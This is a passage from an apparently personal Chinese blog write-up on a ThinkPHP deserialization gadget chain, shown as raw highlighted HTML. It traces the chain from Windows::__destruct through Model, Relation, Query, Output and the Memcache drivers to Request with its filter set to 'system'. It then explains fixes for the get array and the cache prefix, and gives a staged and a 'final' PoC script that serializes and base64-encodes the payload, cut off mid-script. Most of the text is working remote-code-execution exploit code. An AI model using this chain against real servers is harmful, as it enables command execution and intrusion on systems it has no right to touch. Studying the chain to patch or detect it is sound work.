punctuation">\</span>Memcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class Output</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcache</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Output</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="从起点找调用位置"><a href="#从起点找调用位置" class="headerlink" title="从起点找调用位置"></a>从起点找调用位置</h2><p>虽说上面其实已经可以去接poc了，不过我还是按正常逻辑分析一次</p><blockquote><p>首先需要明确</p><p>找反序列化的过程都分为两个，一个是找起点，一个是找终点</p><p>这条链是假设在找到了终点的情况下去逆推调用起点</p></blockquote><ul><li><p>终点：</p><p>  在反序列化中，最终用来执行我们目录的位置是终点</p></li><li><p>起点：</p><p>  程序最初必然调用的点是起点</p><p>  简单来说：我们自然可以直接new 一个类去调用，但直接调用类不一定会调用进相应的方法，所以起点就是只要程序执行，就必然会调用的那个类，比如：<code>__destruct()</code>,<code>__wake()</code>等，偶尔也可以直接用<code>__call()</code>等方法</p><p>  总而言之，起点即为web应用类中必然执行的方法</p></li></ul><p>在这两条链中，起点是thinkphp/library/think/process/pipes/Windows.php 下的<code>__destruct()</code>方法</p><p>所以首先是Windows</p><p><img src="image-20211013190812410.png" alt="image-20211013190812410"></p><p><img src="image-20211013190850613.png" alt="image-20211013190850613"></p><p><img src="image-20211013190912843.png" alt="image-20211013190912843"></p><p>后面就一样了</p><pre class="line-numbers language-php"><code class="language-php">阶段poc<span class="token comment" spellcheck="true">//class Request 执行终点</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Request</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string">"system"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//abstract class Driver{} Memcache父类</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Request</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Driver</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class Memcache extends Driver 调向Request</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>Driver</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Memcache</span> <span class="token keyword">extends</span> <span class="token class-name">Driver</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class Memcache extends SessionHandler 调向上面Memcache类的set方法</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">SessionHandler</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Memcache</span> <span class="token keyword">extends</span> <span class="token class-name">SessionHandler</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class Output</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcache</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Output</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// TODO 断点</span><span class="token comment" spellcheck="true">//class Query 指向Output</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Query</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//abstract class Relation</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Relation</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//abstract class OneToOne extends Relation</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Relation</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">OneToOne</span> <span class="token keyword">extends</span> <span class="token class-name">Relation</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"no"</span><span class="token punctuation">,</span><span class="token string">"123"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class BelongsTo extends OneToOne</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">BelongsTo</span> <span class="token keyword">extends</span> <span class="token class-name">OneToOne</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//abstract class Model 指向Output类__call()</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>BelongsTo</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'getError'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BelongsTo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class Pivot extends Model 继承Model,通过此类调用进Model</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//abstract class Pipes Windows继承类</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class Windows extends Pipes 起点类 指向Pivot类</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Windows</span> <span class="token keyword">extends</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$Windows</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$Windows</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>最终exp还要修改几个小点才可以调用成功，这里是我漏的几点分析</p><p>其实就是Request中input的一处判断问题</p><p><img src="image-20211013212652688.png" alt="image-20211013212652688"></p><h3 id="exp分析-补"><a href="#exp分析-补" class="headerlink" title="exp分析(补)"></a>exp分析(补)</h3><h4 id="Request中get赋值问题"><a href="#Request中get赋值问题" class="headerlink" title="Request中get赋值问题"></a>Request中get赋值问题</h4><p>如果用阶段poc打，会在如图所示的位置出问题</p><p><img src="image-20211013211917186.png" alt="image-20211013211917186"></p><p><strong>在Request.php中调用get()方法时，如果get值为空，则会自动调用传入的get，导致get变成$_GET传入值</strong></p><p>并如下图所示传给input()</p><p><img src="image-20211013212124505.png" alt="image-20211013212124505"></p><p>并会造成getinput()中if语句不能成功匹配，导致rce链中断</p><p><img src="image-20211013212347171.png" alt="image-20211013212347171"></p><p>所以需要给get赋值</p><h3 id="isset-data-val"><a href="#isset-data-val" class="headerlink" title="isset($data[$val]"></a>isset($data[$val]</h3><p>先随便赋值看看下一个问题</p><p><img src="image-20211013212804889.png" alt="image-20211013212804889"></p><p>上一个问题点成功绕过</p><p><img src="image-20211013213022459.png" alt="image-20211013213022459"></p><p>下个问题点</p><p><img src="image-20211013213156418.png" alt="image-20211013213156418"></p><p>显然,$data[$val]这个齐齐怪怪的东西在$data中不存在，$data就是传入的get数组</p><p>所以：**$val的值等于传入get数组的key值**</p><p>然后再下图处完成$filter的赋值</p><p><img src="image-20211013213855627.png" alt="image-20211013213855627"></p><p>而在下面**<code>$this-&gt;filterValue($data, $name, $filter);</code> $data（传入get数组的value值）做为参数&amp;$value传入**</p><p>并在终点执行</p><p><img src="image-20211013214240347.png" alt="image-20211013214240347"></p><p><strong>这里的foreach 告诉我们,传入的filter最好为数组，不过调试时我发现框架会自己吧字符串变成数组，所以这里无所谓数组字符串</strong></p><p>言归正传</p><p>说了这么多，我就是想说，别把$data浪费了，所以<strong>get = [合法 $val(key)=&gt; system函数参数(value)]</strong></p><p>于是 </p><pre class="line-numbers language-php"><code class="language-php">get <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'"&lt;getAttr>no&lt;'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//【手动滑稽】</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>苟是苟了点，不过它不烧脑</p><p><img src="image-20211013215417174.png" alt="image-20211013215417174"></p><p>这不就过去了</p><p>好吧我们正经一点，按gml大佬写的来</p><p><img src="image-20211013220802675.png" alt="image-20211013220802675"></p><p><strong>在这个位置，框架以 <code>/</code>为分界，将$name划为数组【就是上面的<code>&lt;getAttr&gt;no&lt;/getAttr&gt;</code>】</strong></p><p><img src="image-20211013221000548.png" alt="image-20211013221000548"></p><p><strong>而在Driver类的getCacheKey处可以控制$name,将options[‘prefix’] ,拼接到$name前面</strong></p><p><strong>所以 我们可以让<code>options[&#39;prefix&#39;] = xxx/</code>，这样$val就会成为写入的xxx</strong></p><p>然后设置<code>get = [&#39;xxx&#39; =&gt; &#39;dir&#39;]</code>，就可以解决第二个问题</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">get</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'atmujie'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'atmujie/'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样写不就优雅多了</p><p><img src="image-20211013221601612.png" alt="image-20211013221601612"></p><p><img src="image-20211013221447371.png" alt="image-20211013221447371"></p><p>执行成功</p><h3 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//class Request 执行终点</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Request</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$get</span>     <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">get</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'atmujie'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string">"system"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//abstract class Driver{} Memcache父类</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Request</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Driver</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'atmujie/'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class Memcache extends Driver 调向Request</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>Driver</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Memcache</span> <span class="token keyword">extends</span> <span class="token class-name">Driver</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class Memcache extends SessionHandler 调向上面Memcache类的set方法</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">SessionHandler</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Memcache</span> <span class="token keyword">extends</span> <span class="token class-name">SessionHandler</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class Output</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcache</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Output</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// TODO 断点</span><span class="token comment" spellcheck="true">//class Query 指向Output</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Query</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//abstract class Relation</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Relation</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//abstract class OneToOne extends Relation</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Relation</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">OneToOne</span> <span class="token keyword">extends</span> <span class="token class-name">Relation</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"no"</span><span class="token punctuation">,</span><span class="token string">"123"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//class BelongsTo extends OneToOne</span><span class="token 